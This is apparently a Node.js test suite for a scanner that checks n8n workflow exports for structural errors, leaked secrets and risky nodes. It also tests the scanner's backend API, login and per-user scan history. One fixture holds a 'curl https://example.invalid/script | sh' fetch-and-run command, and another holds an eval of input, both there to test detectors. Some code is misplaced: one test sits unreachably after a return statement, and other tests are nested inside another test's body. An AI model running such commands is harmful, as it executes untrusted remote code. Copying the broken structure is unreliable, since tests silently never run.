"use strict";

const assert = require("node:assert/strict");
const { spawnSync } = require("node:child_process");
const fs = require("node:fs");
const http = require("node:http");
const os = require("node:os");
const path = require("node:path");
const { pathToFileURL } = require("node:url");
const { randomUUID } = require("node:crypto");

const { runChecks } = require("../src/core/engine");
const { validateN8n } = require("../src/adapters/n8n.adapter");
const { scanForSecrets } = require("../src/core/secretScanner");
const sdk = require("../sdk");
const { createApp } = require("../backend/server");
const { createRepository } = require("../backend/repository");
const { runMigrations } = require("../backend/db");

const projectRoot = path.resolve(__dirname, "..");
const cliPath = path.join(projectRoot, "bin", "tervic-check.js");
const samplePath = path.join(projectRoot, "examples", "sample_workflow.json");
const invalidJsonPath = path.join(projectRoot, "examples", "invalid_workflow.json");
const secretWorkflowPath = path.join(projectRoot, "examples", "secret_workflow.json");

let passed = 0;
let failed = 0;
const tests = [];

function test(name, callback) {
    tests.push({ name, callback });
}

async function runTests() {
    for (const { name, callback } of tests) {
        try {
            await callback();
            passed += 1;
            console.log(`PASS ${name}`);
        } catch (error) {
            failed += 1;
            console.error(`FAIL ${name}`);
            console.error(error.stack || error.message);
        }
    }

    console.log(`\n${passed} passed, ${failed} failed.`);
    process.exitCode = failed === 0 ? 0 : 1;
}

function runCli(args, options = {}) {
    return spawnSync(process.execPath, [cliPath, ...args], {
        cwd: options.cwd || projectRoot,
        encoding: "utf8"
    });

    test("n8n client stops after its configured pagination bound", async () => {
        let pageCount = 0;
        const mock = await createMockN8n((request, response) => {
            pageCount += 1;
            respondJson(response, 200, {
                data: [],
                nextCursor: `page-${pageCount}`
            });
        });

        try {
            const client = sdk.createN8nClient({ baseUrl: mock.baseUrl, apiKey: "test-key" });
            await assert.rejects(
                client.listWorkflows({ maxPages: 2 }),
                (error) => error.code === "ERR_TERVIC_MAX_PAGES"
            );
            assert.equal(pageCount, 2);
        } finally {
            await mock.close();
        }
    });
}

function findingIds(findings) {
    return findings.map((finding) => finding.ruleId);
}

function nodeWithRequiredProperties(properties) {
    return {
        type: "n8n-nodes-base.noOp",
        typeVersion: 1,
        position: [0, 0],
        parameters: {},
        ...properties
    };
}

async function createMockN8n(handler) {
    const server = http.createServer(handler);
    await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
    const address = server.address();

    return {
        baseUrl: `http://127.0.0.1:${address.port}/instance`,
        close: () => new Promise((resolve, reject) => {
            server.close((error) => error ? reject(error) : resolve());
        })
    };
}

async function createApiServer(repository) {
    const server = createApp({ repository }).listen(0, "127.0.0.1");
    await new Promise((resolve, reject) => {
        server.once("error", reject);
        server.once("listening", resolve);
    });
    const address = server.address();

    return {
        baseUrl: `http://127.0.0.1:${address.port}`,
        close: () => new Promise((resolve, reject) => {
            server.close((error) => error ? reject(error) : resolve());
        })
    };
}

function requestApi(baseUrl, route, body, contentType = "application/json", token) {
    return new Promise((resolve, reject) => {
        const request = http.request(`${baseUrl}${route}`, {
            method: body === undefined ? "GET" : "POST",
            headers: {
                ...(body === undefined ? {} : { "Content-Type": contentType }),
                ...(token ? { Authorization: `Bearer ${token}` } : {})
            }
        }, (response) => {
            let responseBody = "";
            response.setEncoding("utf8");
            response.on("data", (chunk) => { responseBody += chunk; });
            response.on("end", () => {
                if (response.statusCode === 204 || responseBody === "") {
                    resolve({ statusCode: response.statusCode, body: null });
                    return;
                }
                try {
                    resolve({
                        statusCode: response.statusCode,
                        body: JSON.parse(responseBody)
                    });
                } catch (error) {
                    reject(error);
                }
            });
        });
        request.on("error", reject);
        if (body !== undefined) request.write(body);
        request.end();
    });
}

function createMemoryRepository() {
    const users = new Map();
    const sessions = new Map();
    const scans = new Map();

    return {
        async healthCheck() {},
        async createUser(email, password_hash) {
            if (users.has(email)) {
                const error = new Error("duplicate email");
                error.code = "23505";
                throw error;
            }
            const user = { id: randomUUID(), email, password_hash, created_at: new Date() };
            users.set(email, user);
            return user;
        },
        async findUserByEmail(email) {
            return users.get(email) || null;
        },
        async createSession(tokenHash, userId, expiresAt) {
            sessions.set(tokenHash, { userId, expiresAt });
        },
        async findUserBySession(tokenHash) {
            const session = sessions.get(tokenHash);
            if (!session || session.expiresAt <= new Date()) return null;
            return [...users.values()].find((user) => user.id === session.userId) || null;
        },
        async deleteSession(tokenHash) {
            sessions.delete(tokenHash);
        },
        async createScan(scan) {
            const record = {
                id: randomUUID(),
                ...scan,
                started_at: scan.startedAt,
                workflow_name: scan.workflowName,
                workflow_external_id: scan.workflowExternalId,
                workflow_node_count: scan.workflowNodeCount,
                status: "running",
                total_findings: 0,
                findings: []
            };
            scans.set(record.id, record);
            return { id: record.id, started_at: record.started_at };
        },
        async completeScan(scanId, userId, result, completedAt, durationMs, workflowMetadata = {}) {
            const record = scans.get(scanId);
            assert.ok(record && record.userId === userId);
            Object.assign(record, {
                status: "completed",
                completed_at: completedAt,
                duration_ms: durationMs,
                total_findings: result.totalFindings,
                result,
                findings: result.findings,
                ...(workflowMetadata.workflowName ? { workflow_name: workflowMetadata.workflowName } : {}),
                ...(workflowMetadata.workflowExternalId ? { workflow_external_id: workflowMetadata.workflowExternalId } : {})
            });
        },
        async failScan(scanId, userId, completedAt, durationMs, errorCode) {
            const record = scans.get(scanId);
            if (!record || record.userId !== userId) return;
            Object.assign(record, {
                status: "failed",
                completed_at: completedAt,
                duration_ms: durationMs,
                error_code: errorCode
            });
        },
        async listScans(userId, limit) {
            return [...scans.values()]
                .filter((scan) => scan.userId === userId)
                .sort((left, right) => right.started_at - left.started_at)
                .slice(0, limit);
        },
        async findScan(scanId, userId) {
            const record = scans.get(scanId);
            return record && record.userId === userId ? record : null;
        }
    };
}

async function registerTestUser(server, email = "owner@example.com") {
    const response = await requestApi(
        server.baseUrl,
        "/api/v1/auth/register",
        JSON.stringify({ email, password: "correct horse battery staple" })
    );
    assert.equal(response.statusCode, 201);
    return response.body;
}

function respondJson(response, statusCode, value) {
    response.writeHead(statusCode, { "Content-Type": "application/json" });
    response.end(JSON.stringify(value));
}

test("backend health and sample workflow scan return the API contract", async () => {
    const repository = createMemoryRepository();
    const server = await createApiServer(repository);
    try {
        const health = await requestApi(server.baseUrl, "/api/health");
        assert.equal(health.statusCode, 200);
        assert.deepEqual(health.body, { status: "ok", database: "connected" });
        const account = await registerTestUser(server);

        const workflow = JSON.parse(fs.readFileSync(samplePath, "utf8"));
        const scan = await requestApi(server.baseUrl, "/api/v1/scans", JSON.stringify({
            platform: "n8n",
            workflow
        }), "application/json", account.token);
        assert.equal(scan.statusCode, 200);
        assert.equal(scan.body.platform, "n8n");
        assert.deepEqual(scan.body.findings, []);
        assert.equal(scan.body.totalFindings, 0);
        assert.equal(scan.body.status, "completed");
        assert.equal(scan.body.analysisCoverage.dataFlow.status, "partial");
        assert.equal(scan.body.scannerVersion, require("../sdk/package.json").version);
        assert.deepEqual(scan.body.workflowMetrics, {
            nodeCount: workflow.nodes.length,
            connectionCount: 1
        });
        assert.equal(scan.body.checkSummary.totalChecks, scan.body.checkSummary.checks.length);
        assert.equal(
            scan.body.checkSummary.checksExecuted + scan.body.checkSummary.checksSkipped,
            scan.body.checkSummary.totalChecks
        );
        assert.equal(scan.body.workflow.name, workflow.name);
        assert.ok(scan.body.durationMs >= 0);

        const history = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            undefined,
            "application/json",
            account.token
        );
        assert.equal(history.statusCode, 200);
        assert.equal(history.body.scans.length, 1);
        assert.equal(history.body.scans[0].id, scan.body.id);
        assert.deepEqual(history.body.scans[0].workflowMetrics, scan.body.workflowMetrics);
        assert.equal(history.body.scans[0].severitySummary.high, 0);
        assert.equal(history.body.scans[0].severitySummary.medium, 0);
    } finally {
        await server.close();
    }
});

test("backend reports scan findings and rejects invalid scan requests", async () => {
    const server = await createApiServer(createMemoryRepository());
    try {
        const account = await registerTestUser(server);
        const scan = await requestApi(server.baseUrl, "/api/v1/scans", JSON.stringify({
            workflow: null
        }), "application/json", account.token);
        assert.equal(scan.statusCode, 200);
        assert.equal(scan.body.findings[0].ruleId, "N8N001");
        const history = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            undefined,
            "application/json",
            account.token
        );
        assert.equal(history.body.scans[0].severitySummary.high, 1);
        const savedScan = await requestApi(
            server.baseUrl,
            `/api/v1/scans/${scan.body.id}`,
            undefined,
            "application/json",
            account.token
        );
        assert.deepEqual(savedScan.body.scan.result.findings, scan.body.findings);

        const secretValue = "backend-private-secret-value";
        const secretScan = await requestApi(server.baseUrl, "/api/v1/scans", JSON.stringify({
            workflow: {
                nodes: [],
                connections: {},
                credentials: { api_key: secretValue }
            }
        }), "application/json", account.token);
        assert.equal(secretScan.statusCode, 200);
        assert(secretScan.body.findings.some((finding) => finding.ruleId === "SECRET001"));
        assert.equal(JSON.stringify(secretScan.body).includes(secretValue), false);
        const savedSecretScan = await requestApi(
            server.baseUrl,
            `/api/v1/scans/${secretScan.body.id}`,
            undefined,
            "application/json",
            account.token
        );
        assert.equal(savedSecretScan.statusCode, 200);
        assert.equal(JSON.stringify(savedSecretScan.body).includes(secretValue), false);

        const metadataSecret = "api_key: metadata-secret-value";
        const metadataScan = await requestApi(server.baseUrl, "/api/v1/scans", JSON.stringify({
            workflow: {
                name: metadataSecret,
                id: "access_token: workflow-id-secret",
                nodes: [],
                connections: {}
            }
        }), "application/json", account.token);
        assert.equal(metadataScan.statusCode, 200);
        assert.equal(metadataScan.body.workflow.name, "[REDACTED]");
        assert.equal(metadataScan.body.workflow.externalId, "[REDACTED]");
        assert.equal(JSON.stringify(metadataScan.body).includes(metadataSecret), false);
        const savedMetadataScan = await requestApi(
            server.baseUrl,
            `/api/v1/scans/${metadataScan.body.id}`,
            undefined,
            "application/json",
            account.token
        );
        assert.equal(JSON.stringify(savedMetadataScan.body).includes("workflow-id-secret"), false);

        const missingWorkflow = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            "{}",
            "application/json",
            account.token
        );
        assert.equal(missingWorkflow.statusCode, 400);
        assert.match(missingWorkflow.body.error, /include a workflow/);

        const unsupportedPlatform = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            JSON.stringify({ platform: "unsupported", workflow: {} }),
            "application/json",
            account.token
        );
        assert.equal(unsupportedPlatform.statusCode, 400);
        assert.equal(unsupportedPlatform.body.code, "ERR_TERVIC_UNSUPPORTED_PLATFORM");

        const malformedJson = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            "{",
            "application/json",
            account.token
        );
        assert.equal(malformedJson.statusCode, 400);
        assert.match(malformedJson.body.error, /valid JSON/);

        const wrongContentType = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            "{}",
            "text/plain",
            account.token
        );
        assert.equal(wrongContentType.statusCode, 415);

        const failedScanHistory = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            undefined,
            "application/json",
            account.token
        );
        assert.equal(failedScanHistory.body.scans[0].status, "failed");
    } finally {
        await server.close();
    }
});

test("backend authenticates accounts and isolates scan history by user", async () => {
    const server = await createApiServer(createMemoryRepository());
    try {
        const account = await registerTestUser(server);
        const loginResponse = await requestApi(
            server.baseUrl,
            "/api/v1/auth/login",
            JSON.stringify({ email: "OWNER@example.com", password: "correct horse battery staple" })
        );
        assert.equal(loginResponse.statusCode, 200);
        assert.equal(loginResponse.body.user.email, "owner@example.com");

        const unauthenticated = await requestApi(server.baseUrl, "/api/v1/scans");
        assert.equal(unauthenticated.statusCode, 401);

        const wrongPassword = await requestApi(
            server.baseUrl,
            "/api/v1/auth/login",
            JSON.stringify({ email: "owner@example.com", password: "wrong password" })
        );
        assert.equal(wrongPassword.statusCode, 401);
        assert.match(wrongPassword.body.error, /incorrect/);

        const duplicate = await requestApi(
            server.baseUrl,
            "/api/v1/auth/register",
            JSON.stringify({ email: "OWNER@example.com", password: "correct horse battery staple" })
        );
        assert.equal(duplicate.statusCode, 409);

        const shortPassword = await requestApi(
            server.baseUrl,
            "/api/v1/auth/register",
            JSON.stringify({ email: "short@example.com", password: "too-short" })
        );
        assert.equal(shortPassword.statusCode, 400);

        const workflow = JSON.parse(fs.readFileSync(secretWorkflowPath, "utf8"));
        const scan = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            JSON.stringify({ workflow }),
            "application/json",
            account.token
        );
        assert.equal(scan.statusCode, 200);
        assert.ok(scan.body.totalFindings > 0);

        const otherAccount = await registerTestUser(server, "other@example.com");
        const otherHistory = await requestApi(
            server.baseUrl,
            "/api/v1/scans",
            undefined,
            "application/json",
            otherAccount.token
        );
        assert.deepEqual(otherHistory.body.scans, []);

        const otherScanRead = await requestApi(
            server.baseUrl,
            `/api/v1/scans/${scan.body.id}`,
            undefined,
            "application/json",
            otherAccount.token
        );
        assert.equal(otherScanRead.statusCode, 404);

        const stored = await requestApi(
            server.baseUrl,
            `/api/v1/scans/${scan.body.id}`,
            undefined,
            "application/json",
            account.token
        );
        assert.equal(stored.statusCode, 200);
        assert.equal(stored.body.scan.findings.length, scan.body.findings.length);
        assert.equal(JSON.stringify(stored.body).includes("fixture-known-token-value"), false);

        const logout = await requestApi(
            server.baseUrl,
            "/api/v1/auth/logout",
            "{}",
            "application/json",
            account.token
        );
        assert.equal(logout.statusCode, 204);
        const revokedSession = await requestApi(
            server.baseUrl,
            "/api/v1/auth/me",
            undefined,
            "application/json",
            account.token
        );
        assert.equal(revokedSession.statusCode, 401);
    } finally {
        await server.close();
    }
});

test("PostgreSQL repository commits findings atomically and scopes history queries", async () => {
    const statements = [];
    let failFindingInsert = false;
    let released = 0;
    const client = {
        async query(sql, values) {
            statements.push({ sql, values });
            if (failFindingInsert && sql.includes("INSERT INTO scan_findings")) {
                throw new Error("simulated insert failure");
            }
            if (sql.includes("UPDATE scans")) return { rowCount: 1 };
            return { rowCount: 1, rows: [] };
        },
        release() { released += 1; }
    };
    const pool = {
        async connect() { return client; },
        async query(sql, values) {
            statements.push({ sql, values });
            return { rowCount: 0, rows: [] };
        }
    };
    const repository = createRepository(pool);
    const scanId = randomUUID();
    const userId = randomUUID();
    const finding = { ruleId: "SECRET001", severity: "warning", message: "redacted" };

    await repository.completeScan(
        scanId,
        userId,
        { totalFindings: 1, findings: [finding] },
        new Date(),
        12
    );
    assert.deepEqual(statements.map((entry) => entry.sql.trim().split(/\s+/)[0]), [
        "BEGIN",
        "UPDATE",
        "INSERT",
        "COMMIT"
    ]);
    assert.deepEqual(statements[1].values.slice(0, 2), [scanId, userId]);
    assert.deepEqual(statements[2].values.slice(0, 3), [scanId, 0, "SECRET001"]);
    assert.equal(released, 1);

    statements.length = 0;
    failFindingInsert = true;
    await assert.rejects(
        repository.completeScan(
            scanId,
            userId,
            { totalFindings: 1, findings: [finding] },
            new Date(),
            12
        ),
        /simulated insert failure/
    );
    assert.equal(statements[statements.length - 1].sql.trim(), "ROLLBACK");
    assert.equal(released, 2);

    statements.length = 0;
    await repository.listScans(userId, 25);
    assert.match(statements[0].sql, /WHERE user_id = \$1/);
    assert.deepEqual(statements[0].values, [userId, 25]);
});

test("PostgreSQL migration runner applies the schema once inside a transaction", async () => {
    let applied = false;
    let released = 0;
    const statements = [];
    const client = {
        async query(sql) {
            statements.push(sql);
            if (sql.includes("SELECT version FROM schema_migrations")) {
                return { rowCount: applied ? 1 : 0 };
            }
            if (sql.startsWith("INSERT INTO schema_migrations")) applied = true;
            return { rowCount: 1 };
        },
        release() { released += 1; }
    };

    await runMigrations({ connect: async () => client });
    assert.equal(statements[0], "BEGIN");
    assert.ok(statements.some((sql) => sql.includes("pg_advisory_xact_lock")));
    assert.ok(statements.some((sql) => sql.includes("CREATE TABLE users")));
    assert.equal(statements[statements.length - 1], "COMMIT");

    statements.length = 0;
    await runMigrations({ connect: async () => client });
    assert.equal(statements.some((sql) => sql.includes("CREATE TABLE users")), false);
    assert.equal(statements[statements.length - 1], "COMMIT");
    assert.equal(released, 2);
});

test("backend health reports an unavailable database and scan history bounds limits", async () => {
    const repository = createMemoryRepository();
    repository.healthCheck = async () => { throw new Error("database unavailable"); };
    const server = await createApiServer(repository);
    try {
        const health = await requestApi(server.baseUrl, "/api/health");
        assert.equal(health.statusCode, 503);
        assert.deepEqual(health.body, { status: "unavailable", database: "disconnected" });

        const account = await registerTestUser(server);
        const invalidLimit = await requestApi(
            server.baseUrl,
            "/api/v1/scans?limit=101",
            undefined,
            "application/json",
            account.token
        );
        assert.equal(invalidLimit.statusCode, 400);
        assert.match(invalidLimit.body.error, /limit must be an integer/);
    } finally {
        await server.close();
    }
});

test("valid sample workflow passes the engine", () => {
    const workflow = JSON.parse(fs.readFileSync(samplePath, "utf8"));
    const result = runChecks(workflow);

    assert.equal(result.platform, "n8n");
    assert.equal(result.totalFindings, 0);
    assert.deepEqual(result.findings, []);
});

test("n8n adapter reports nodes without names or IDs", () => {
    const findings = validateN8n({
        nodes: [
            nodeWithRequiredProperties({ id: "node-1" }),
            nodeWithRequiredProperties({ name: "Unnamed ID" })
        ],
        connections: {}
    });

    assert.deepEqual(findingIds(findings), ["N8N014", "N8N005"]);
});

test("non-object workflows are rejected", () => {
    const findings = validateN8n(null);

    assert.deepEqual(findingIds(findings), ["N8N001"]);
});

test("missing nodes and connections are reported", () => {
    const findings = validateN8n({});

    assert.deepEqual(findingIds(findings), ["N8N002", "N8N003"]);
});

test("invalid nodes and duplicate identifiers are reported", () => {
    const findings = validateN8n({
        nodes: [
            nodeWithRequiredProperties({ id: "duplicate", name: "First" }),
            nodeWithRequiredProperties({ id: "duplicate", name: "Second" }),
            null
        ],
        connections: {}
    });

    assert.deepEqual(findingIds(findings), ["N8N006", "N8N004"]);
});

test("duplicate node names are reported", () => {
    const findings = validateN8n({
        nodes: [
            nodeWithRequiredProperties({ id: "first", name: "Repeated" }),
            nodeWithRequiredProperties({ id: "second", name: "Repeated" })
        ],
        connections: {}
    });

    assert.deepEqual(findingIds(findings), ["N8N007"]);
});

test("node schema checks catch missing required n8n properties and invalid metadata", () => {
    const findings = validateN8n({
        nodes: [
            nodeWithRequiredProperties({ id: "missing-type", name: "Missing type", type: "" }),
            { id: "incomplete", name: "Incomplete", type: "n8n-nodes-base.noOp" }
        ],
        connections: {},
        settings: []
    });

    assert.deepEqual(findingIds(findings), ["N8N017", "N8N015", "N8N016"]);
    assert(findings.every((finding) => finding.severity === "error"));
    assert.deepEqual(validateN8n({
        nodes: [],
        connections: {},
        settings: null,
        meta: null,
        staticData: null,
        pinData: null,
        tags: null
    }), []);
});

test("node names differing only by surrounding whitespace remain distinct", () => {
    const findings = validateN8n({
        nodes: [
            nodeWithRequiredProperties({ id: "one", name: "Node", typeVersion: 4.2 }),
            nodeWithRequiredProperties({ id: "two", name: " Node " })
        ],
        connections: {}
    });

    assert.deepEqual(findings, []);
});

test("missing connection sources and targets are reported", () => {
    const findings = validateN8n({
        nodes: [nodeWithRequiredProperties({ id: "node-1", name: "Existing" })],
        connections: {
            MissingSource: { main: [[{ node: "MissingTarget", type: "main", index: 0 }]] }
        }
    });

    assert.deepEqual(findingIds(findings), ["N8N008", "N8N010"]);
});

test("invalid connection output structures are reported", () => {
    const findings = validateN8n({
        nodes: [nodeWithRequiredProperties({ id: "node-1", name: "Existing" })],
        connections: { Existing: null }
    });

    test("n8n adapter reports malformed branches and connections", () => {
        const findings = validateN8n({
            nodes: [nodeWithRequiredProperties({ id: "node-1", name: "Existing" })],
            connections: {
                Existing: {
                    main: [null, [{}]],
                    error: "not-an-array"
                }
            }
        });

        assert.deepEqual(findingIds(findings), ["N8N012", "N8N013", "N8N011"]);
        assert(findings.every((finding) => finding.location.startsWith("connections.")));
    });

    test("n8n adapter accepts branching, optional outputs, and extra export metadata", () => {
        const findings = validateN8n({
            name: "Branching workflow",
            nodes: [
                nodeWithRequiredProperties({ id: "trigger", name: "Start", type: "n8n-nodes-base.manualTrigger" }),
                nodeWithRequiredProperties({ id: "if", name: "Condition", type: "n8n-nodes-base.if" }),
                nodeWithRequiredProperties({ id: "yes", name: "Yes path", type: "n8n-nodes-base.noOp" }),
                nodeWithRequiredProperties({ id: "no", name: "No path", type: "n8n-nodes-base.noOp" })
            ],
            connections: {
                Start: { main: [[{ node: "Condition", type: "main", index: 0 }]] },
                Condition: {
                    main: [
                        [{ node: "Yes path", type: "main", index: 0 }],
                        [{ node: "No path", type: "main", index: 0 }]
                    ]
                },
                "Yes path": { main: [] },
                "No path": { main: [] }
            },
            settings: { executionOrder: "v1" },
            tags: [{ id: "tag-1", name: "test" }]
        });

        assert.deepEqual(findings, []);
    });

    assert.deepEqual(findingIds(findings), ["N8N009"]);
    assert.deepEqual(findingIds(validateN8n({
        nodes: [nodeWithRequiredProperties({ id: "node-1", name: "Existing" })],
        connections: {
            Existing: { main: [[{ node: "Existing", type: "main", index: -1 }]] }
        }
    })), ["N8N013"]);
});

test("secret findings identify locations without exposing values", () => {
    const secretValue = "private-test-value-123";
    const findings = scanForSecrets({
        credentials: { api_key: secretValue }
    });

    assert.equal(findings.length, 1);
    assert.equal(findings[0].ruleId, "SECRET001");
    assert.equal(findings[0].location, "workflow.credentials.api_key");
    assert.equal(JSON.stringify(findings).includes(secretValue), false);
});

test("secret scanning recognizes named Set assignments inside node parameters", () => {
    const secretValue = "node-parameter-secret-123";
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "set",
                name: "Set credentials",
                type: "n8n-nodes-base.set",
                typeVersion: 3,
                parameters: {
                    includeOtherFields: false,
                    assignments: {
                        assignments: [{ name: "api_key", value: secretValue, type: "string" }]
                    }
                }
            })
        ],
        connections: {}
    });
    const finding = result.findings.find((entry) => entry.ruleId === "SECRET001");

    assert(finding);
    assert.equal(finding.nodeId, "set");
    assert.match(finding.location, /assignments\[0\]\.value$/);
    assert.equal(JSON.stringify(result).includes(secretValue), false);
});

test("secret placeholders are ignored", () => {
    const findings = scanForSecrets({
        api_key: "YOUR_API_KEY",
        password: "example-password",
        client_secret: "<replace-me>",
        tokenCount: 3,
        secretEnabled: true
    });

    assert.deepEqual(findings, []);
});

test("graph checks report unreachable components and possible cycles as warnings", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({ id: "trigger", name: "Start", type: "n8n-nodes-base.manualTrigger" }),
            nodeWithRequiredProperties({ id: "step", name: "Step" }),
            nodeWithRequiredProperties({ id: "loop-a", name: "Loop A" }),
            nodeWithRequiredProperties({ id: "loop-b", name: "Loop B" })
        ],
        connections: {
            Start: { main: [[{ node: "Step", type: "main", index: 0 }]] },
            "Loop A": { main: [[{ node: "Loop B", type: "main", index: 0 }]] },
            "Loop B": { main: [[{ node: "Loop A", type: "main", index: 0 }]] }
        }
    });

    const graphFindings = result.findings.filter((finding) => finding.ruleId.startsWith("GRAPH"));
    assert.deepEqual(findingIds(graphFindings), ["GRAPH002", "GRAPH003", "GRAPH004"]);
    assert(graphFindings.every((finding) =>
        finding.severity === "warning" && finding.certainty === "heuristic"
    ));
    assert.match(graphFindings[0].message, /2 node\(s\)/);
    assert.equal(graphFindings[0].nodeName, "Loop A");
});

test("graph analysis handles optional outputs and bounds traversal", () => {
    const valid = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({ id: "trigger", name: "Start", type: "n8n-nodes-base.manualTrigger" }),
            nodeWithRequiredProperties({ id: "last", name: "Last" })
        ],
        connections: { Start: { main: [[{ node: "Last", type: "main", index: 0 }]] } }
    });
    assert.equal(valid.findings.some((finding) => finding.ruleId.startsWith("GRAPH")), false);

    const limited = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({ id: "trigger", name: "Start", type: "n8n-nodes-base.manualTrigger" }),
            nodeWithRequiredProperties({ id: "last", name: "Last" })
        ],
        connections: { Start: { main: [[{ node: "Last", type: "main", index: 0 }]] } }
    }, { limits: { maxConnections: 1 } });
    assert(limited.findings.some((finding) => finding.ruleId === "TERVIC.LIMIT.001"));
    assert.equal(limited.findings.some((finding) => finding.ruleId.startsWith("GRAPH")), false);
});

test("graph checks classify an unrecognized entry point as heuristic", () => {
    const workflow = {
        nodes: [nodeWithRequiredProperties({ id: "custom", name: "Custom", type: "community.customNode" })],
        connections: {}
    };
    const result = sdk.scanWorkflow(workflow);

    const finding = result.findings.find((entry) => entry.ruleId === "GRAPH001");
    assert(finding);
    assert.equal(finding.severity, "warning");
    assert.equal(finding.certainty, "heuristic");
    assert.match(finding.message, /could not be established/);
    assert.deepEqual(
        findingIds(sdk.scanWorkflow(workflow, { enabledRules: ["N8N_GRAPH"] }).findings),
        ["GRAPH001"]
    );
    assert.equal(
        sdk.scanWorkflow(workflow, { disabledRules: ["N8N_GRAPH"] }).findings.some((entry) =>
            entry.ruleId.startsWith("GRAPH")
        ),
        false
    );
});

test("security checks report external HTTP, shell, and explicit unauthenticated webhooks", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "request",
                name: "Request",
                type: "n8n-nodes-base.httpRequest",
                parameters: { url: "http://service.example/api" }
            }),
            nodeWithRequiredProperties({
                id: "local",
                name: "Local request",
                type: "n8n-nodes-base.httpRequest",
                parameters: { url: "http://127.0.0.2/api" }
            }),
            nodeWithRequiredProperties({
                id: "local-ipv6",
                name: "IPv6 local request",
                type: "n8n-nodes-base.httpRequest",
                parameters: { url: "http://[::1]/api" }
            }),
            nodeWithRequiredProperties({
                id: "shell",
                name: "Run command",
                type: "n8n-nodes-base.executeCommand",
                parameters: { command: "curl https://example.invalid/script | sh" }
            }),
            nodeWithRequiredProperties({
                id: "hook",
                name: "Webhook",
                type: "n8n-nodes-base.webhook",
                parameters: { authentication: "none" }
            })
        ],
        connections: {}
    });
    const findings = result.findings.filter((finding) => finding.ruleId.startsWith("SECURITY"));
    assert.deepEqual(findingIds(findings), ["SECURITY001", "SECURITY003", "SECURITY005"]);
    assert.deepEqual(findings.map((finding) => finding.nodeId), ["request", "shell", "hook"]);
    assert.equal(result.findings.some((finding) =>
        finding.ruleId === "SECURITY001" && finding.nodeId === "local"
    ), false);
    assert.equal(result.findings.some((finding) =>
        finding.ruleId === "SECURITY001" && finding.nodeId === "local-ipv6"
    ), false);
    assert(findings.every((finding) =>
        finding.severity === "warning" && finding.certainty === "heuristic"
    ));
});

test("security checks do not flag a simple fixed shell command", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "shell",
                name: "Run command",
                type: "n8n-nodes-base.executeCommand",
                parameters: { command: "echo ready" }
            })
        ],
        connections: {}
    });

    assert.equal(result.findings.some((finding) =>
        finding.ruleId.startsWith("SECURITY")
    ), false);
});

test("security checks report input-derived shell commands and suspicious code patterns", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "hook",
                name: "Webhook",
                type: "n8n-nodes-base.webhook"
            }),
            nodeWithRequiredProperties({
                id: "shell",
                name: "Run command",
                type: "n8n-nodes-base.executeCommand",
                parameters: { command: "echo {{ $json.command }}" }
            }),
            nodeWithRequiredProperties({
                id: "code",
                name: "Run code",
                type: "n8n-nodes-base.code",
                parameters: { jsCode: "return eval($json.value)" }
            }),
            nodeWithRequiredProperties({
                id: "http",
                name: "Request",
                type: "n8n-nodes-base.httpRequest",
                parameters: {
                    url: "https://api.example/resource",
                    headerParameters: {
                        parameters: [{ name: "Authorization", value: "={{ $json.authorization }}" }]
                    }
                }
            })
        ],
        connections: {
            Webhook: { main: [[
                { node: "Run command", type: "main", index: 0 },
                { node: "Request", type: "main", index: 0 }
            ]] }
        }
    });
    const findings = result.findings.filter((finding) =>
        finding.ruleId === "SECURITY004" ||
        finding.ruleId === "SECURITY006" ||
        finding.ruleId === "SECURITY008"
    );
    assert.deepEqual(findingIds(findings), ["SECURITY004", "SECURITY006", "SECURITY008"]);
    assert(findings.every((finding) => finding.certainty === "heuristic"));
});

test("security checks potential sensitive-field flow to an external request", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "set",
                name: "Set",
                type: "n8n-nodes-base.set",
                typeVersion: 3,
                parameters: {
                    includeOtherFields: false,
                    assignments: { assignments: [{ name: "password", value: "placeholder", type: "string" }] }
                }
            }),
            nodeWithRequiredProperties({
                id: "send",
                name: "Send",
                type: "n8n-nodes-base.httpRequest",
                parameters: {
                    url: "https://api.example/submit",
                    body: "={{ $json.password }}"
                }
            })
        ],
        connections: {
            Set: { main: [[{ node: "Send", type: "main", index: 0 }]] }
        }
    });
    const finding = result.findings.find((entry) => entry.ruleId === "SECURITY007");
    assert(finding);
    assert.equal(finding.nodeId, "send");
    assert.equal(finding.location, "nodes[1].parameters.body");
    assert.equal(finding.severity, "warning");
    assert.equal(finding.certainty, "heuristic");
});

test("secret and URL credential findings identify nodes without exposing credentials", () => {
    const password = "url-private-password-123";
    const workflow = {
        nodes: [
            nodeWithRequiredProperties({
                id: "http",
                name: "HTTP",
                type: "n8n-nodes-base.httpRequest",
                parameters: {
                    url: `https://user:${password}@api.example/resource`,
                    headerParameters: { parameters: [{ name: "Authorization", value: "Bearer header-secret-123" }] }
                }
            })
        ],
        connections: {}
    };
    const result = sdk.scanWorkflow(workflow);
    const securityFindings = result.findings.filter((finding) =>
        finding.ruleId === "SECURITY002" || finding.ruleId === "SECRET001"
    );

    assert(securityFindings.some((finding) => finding.ruleId === "SECURITY002"));
    assert.equal(
        securityFindings.find((finding) => finding.ruleId === "SECURITY002").certainty,
        "confirmed"
    );
    assert(securityFindings.some((finding) => finding.ruleId === "SECRET001" &&
        finding.location.includes("headerParameters")));
    assert.equal(securityFindings.filter((finding) =>
        finding.location.endsWith("nodes[0].parameters.url")
    ).length, 1);
    assert(securityFindings.every((finding) => finding.nodeId === "http"));
    assert.equal(JSON.stringify(result).includes(password), false);
    assert.equal(JSON.stringify(result).includes("header-secret-123"), false);
});

